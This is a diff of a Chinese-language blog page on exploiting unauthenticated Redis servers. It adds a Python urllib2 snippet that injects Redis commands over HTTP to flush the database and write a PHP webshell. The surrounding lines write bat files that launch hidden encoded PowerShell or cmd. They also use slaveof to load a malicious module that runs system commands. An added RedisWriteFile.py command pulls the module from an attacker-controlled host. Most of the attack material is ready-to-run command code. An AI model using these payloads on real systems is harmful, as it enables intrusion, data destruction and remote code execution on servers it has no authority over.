@@ -442,14 +442,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.2k
+                    4.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    17 分
+                    18 分
                 </div>
                 
 
@@ -465,6 +465,12 @@
 <p>2.<a target="_blank" rel="noopener" href="https://github.com/caoxinyu/RedisClient">RedisClient</a> ，是一个带GUI的管理工具，有exe和Jar包两种可执行文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b9c3e605076e53db04eacead51fa9d22.png"></p>
 <p>3.<a target="_blank" rel="noopener" href="https://github.com/lloy1231/RedisDesktopManager-Windows">redis-desktop-manager</a> ，开源的可视化工具，新版本的安装包需要付费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/832c0d96d1647bc1aa55340600d03ca9.png"></p>
 <p>4.<a target="_blank" rel="noopener" href="https://github.com/qishibo/AnotherRedisDesktopManager">AnotherRedisDesktopManager</a>，另一个可视化管理工具，开源免费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f198fabfa3bbec5e98742d65133b75af.png"></p>
+<p>5.其他方式<br>其他还可以用NC工具来连接使用。甚至在未授权的情况下还可以用python的urllib2模块</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>
+<span class="token keyword">import</span> urllib2
+url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?>'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"</span>
+htmlpage <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>htmlpage<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="Redis-Install-For-Linux"><a href="#Redis-Install-For-Linux" class="headerlink" title="Redis Install For Linux"></a>Redis Install For Linux</h3><p>在Linux上安装Redis，一般以源码编译方式安装，源码详见：<a target="_blank" rel="noopener" href="https://github.com/redis/redis">Redis仓库</a>     <a target="_blank" rel="noopener" href="https://redis.io/download">官网下载地址</a> 。<br>环境搭建首先以源码编译安装的方式在Linux下搭建3.2.0来验证默认配置下的保护模式，然后安装3.0.7版本在默认配置下进行利用，最后安装4.x/5.x/6.x配置未授权进行利用。</p>
 <p>1.先安装下3.2.0版本，观察在3.2.0的默认配置下是否如官网描述的安全性情况：</p>
 <pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-3.2.0.tar.gz
@@ -575,7 +581,8 @@ SLAVEOF host port / REPLICAOF host port
 #断开主从连接
 SLAVEOF ON ONE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="Ridis持久化-数据集备份-利用"><a href="#Ridis持久化-数据集备份-利用" class="headerlink" title="Ridis持久化(数据集备份)利用"></a>Ridis持久化(数据集备份)利用</h3><p>Redis持久化是指可以将数据集保存到本地磁盘中的操作，有RDB和AOF两种方式，详见 <a target="_blank" rel="noopener" href="https://redis.io/topics/persistence%E3%80%82%E9%80%9A%E8%BF%87%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E6%93%8D%E4%BD%9C%E5%B0%86%E6%95%B0%E6%8D%AE%E5%86%99%E5%85%A5%E5%88%B0%E7%A3%81%E7%9B%98%E4%B8%AD%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8%EF%BC%8C%E4%BD%86%E6%98%AF%E6%9F%90%E4%BA%9B%E6%A0%BC%E5%BC%8F%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE%E7%9A%84%E4%BC%9A%E5%8C%85%E5%90%ABRedis%E5%A4%87%E4%BB%BD%E7%9A%84%E6%A0%87%E8%AE%B0%E5%AD%98%E5%9C%A8%E8%84%8F%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%99%E5%8F%AA%E8%83%BD%E7%94%A8%E4%BA%8E%E4%B8%80%E4%BA%9B%E6%9C%89%E5%AE%B9%E9%94%99%E6%80%A7%E7%9A%84%E5%88%A9%E7%94%A8%E3%80%82">https://redis.io/topics/persistence。通过数据备份操作将数据写入到磁盘中进行利用，但是某些格式写入数据的会包含Redis备份的标记存在脏数据，这只能用于一些有容错性的利用。</a></p>
-<h4 id="RDB备份文件利用"><a href="#RDB备份文件利用" class="headerlink" title="RDB备份文件利用"></a>RDB备份文件利用</h4><pre class="line-numbers language-cmd"><code class="language-cmd">DBSIZE                   # 统计KEYS
+<h4 id="RDB备份文件利用"><a href="#RDB备份文件利用" class="headerlink" title="RDB备份文件利用"></a>RDB备份文件利用</h4><p>基础的命令如下：</p>
+<pre class="line-numbers language-cmd"><code class="language-cmd">DBSIZE                   # 统计KEYS
 flushall                  # 如果键过多导致备份过大，全部清空KEYS(危险)
 CONFIG GET slave-read-only      # 查询只读配置
 CONFIG SET slave-read-only no    # 关闭只读配置
@@ -636,7 +643,7 @@ config set dbfilename info.bat
 set x "\r\n\r\npowershell.exe -nop -w hidden -enc xxxxx\r\n\r\n"
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/744be6544214bae378f65fce5ee066d8.png"></p>
-<p><strong>Windows文件覆盖</strong><br>有时候目标服务器一直不会重启，那么可以考虑覆盖一些其他的bat文件等来增加触发几率，可以利用<code>EVAL "return dofile('xxx') 0</code>探测文件是否真的存在，PHPStudy环境中的bat文件，UAC必须关掉：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e48cf26937d98b3a102eb6b412dd96b.png"><br>通过Redis默认的dir参数可以知道绝对路径：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0b77db0e5556150ce63a48b52033dc8a.png"><br>覆盖Apache端口检测check.bat:</p>
+<p><strong>Windows文件覆盖</strong><br>有时候目标服务器一直不会重启，那么可以考虑覆盖一些其他的bat文件等来增加触发几率，可以利用<code>EVAL "return dofile('xxx') 0</code>探测文件是否真的存在。PHPStudy环境中的bat文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e48cf26937d98b3a102eb6b412dd96b.png"><br>通过Redis默认的dir参数可以知道绝对路径：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0b77db0e5556150ce63a48b52033dc8a.png"><br>覆盖Apache端口检测check.bat:</p>
 <pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "D:/phpstudy_pro/Extensions/Apache2.4.39/bin"
 config set dbfilename check.bat
 set x "\r\n\r\nhttpd.exe\r\ncmd /c calc\r\npause > nul\r\n"
@@ -720,8 +727,10 @@ slaveof 192.168.11.1 16379
 module load /tmp/exp.so
 slaveof no one 
 system.exec 'id'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>用RedisWriteFile脚本增加自动命令执行：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/80a9d6fc69b3481dcf76d78ab3e90615.png"></p>
-<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/5366.html">https://www.secpulse.com/archives/5366.html</a><br><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a><br><a target="_blank" rel="noopener" href="https://jkme.github.io/redis-on-windows-dll-hijack.html">https://jkme.github.io/redis-on-windows-dll-hijack.html</a></p>
+<p>用RedisWriteFile脚本增加自动命令执行：</p>
+<pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"/tmp"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile system<span class="token punctuation">.</span>so <span class="token operator">-</span><span class="token operator">-</span>lfile system<span class="token punctuation">.</span>so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/80a9d6fc69b3481dcf76d78ab3e90615.png"></p>
+<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/5366.html">https://www.secpulse.com/archives/5366.html</a><br><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a><br><a target="_blank" rel="noopener" href="https://jkme.github.io/redis-on-windows-dll-hijack.html">https://jkme.github.io/redis-on-windows-dll-hijack.html</a><br><a href="https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/">https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1383,7 +1392,7 @@ system.exec 'id'<span aria-hidden="true" class="line-numbers-rows"><span></span>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">26.5k</span>&nbsp;字
+                class="white-color">26.6k</span>&nbsp;字
             
             
             
